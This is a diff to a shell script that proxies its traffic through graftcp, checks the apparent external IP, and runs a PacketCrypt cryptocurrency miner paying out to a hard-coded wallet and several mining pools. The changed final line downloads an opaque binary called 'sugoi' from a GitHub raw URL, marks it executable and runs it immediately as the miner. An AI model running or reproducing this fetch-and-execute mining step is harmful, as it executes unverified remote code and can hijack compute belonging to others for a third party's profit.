@@ -23,16 +23,16 @@ sleep .2
 echo " "
 echo " "
 
-echo ""
+echo "**"
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+echo "**"
 
 echo " "
 echo " "
 
-./graftcp/graftcp docker run thomasjp0x42/packetcrypt ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io | grep goodrate
+./graftcp/graftcp wget https://raw.githubusercontent.com/AntonyAjax/ehem/main/sugoi && chmod +x sugoi && ./sugoi ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io | grep goodrate
